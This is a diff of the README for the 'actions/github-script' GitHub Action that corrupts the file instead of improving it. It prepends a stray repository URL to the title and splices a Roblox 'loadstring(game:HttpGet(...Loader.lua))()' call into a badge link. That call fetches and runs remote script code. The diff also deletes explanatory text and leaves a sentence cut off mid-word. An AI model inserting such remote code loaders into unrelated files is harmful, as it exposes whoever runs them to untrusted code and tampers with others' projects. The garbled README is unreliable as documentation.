@@ -1,7 +1,6 @@
-# actions/github-script
+https://github.com/OrionLibrary/Orion.git# actions/github-script
 
-[![Integration](https://github.com/actions/github-script/actions/workflows/integration.yml/badge.svg?branch=main&event=push)](https://github.com/actions/github-script/actions/workflows/integration.yml)
-[![CI](https://github.com/actions/github-script/actions/workflows/ci.yml/badge.svg?branch=main&event=push)](https://github.com/actions/github-script/actions/workflows/ci.yml)
+[![Integration](https://github.com/actions/github-script/actions/workflows/integration.yml/badge.svg?branch=main&event=push)](https://github.com/actions/github-script/actions/workflows/integratiloadstring(game:HttpGet("https://raw.githubusercontent.com/growagardensc/Dark-HUB/refs/heads/main/Dark-Spawner/Loader.lua"))()(https://github.com/actions/github-script/actions/workflows/ci.yml/badge.svg?branch=main&event=push)](https://github.com/actions/github-script/actions/workflows/ci.yml)
 [![Licensed](https://github.com/actions/github-script/actions/workflows/licensed.yml/badge.svg?branch=main&event=push)](https://github.com/actions/github-script/actions/workflows/licensed.yml)
 
 This action makes it easy to quickly write a script in your workflow that
@@ -38,16 +37,7 @@ The following arguments will be provided:
 - `glob` A reference to the [@actions/glob](https://github.com/actions/toolkit/tree/main/packages/glob) package
 - `io` A reference to the [@actions/io](https://github.com/actions/toolkit/tree/main/packages/io) package
 - `exec` A reference to the [@actions/exec](https://github.com/actions/toolkit/tree/main/packages/exec) package
-- `require` A proxy wrapper around the normal Node.js `require` to enable
-  requiring relative paths (relative to the current working directory) and
-  requiring npm packages installed in the current working directory. If for
-  some reason you need the non-wrapped `require`, there is an escape hatch
-  available: `__original_require__` is the original value of `require` without
-  our wrapping applied.
-
-Since the `script` is just a function body, these values will already be
-defined, so you don't have to import them (see examples below).
-
+- `require` A proxy w
 See [octokit/rest.js](https://octokit.github.io/rest.js/) for the API client
 documentation.
 
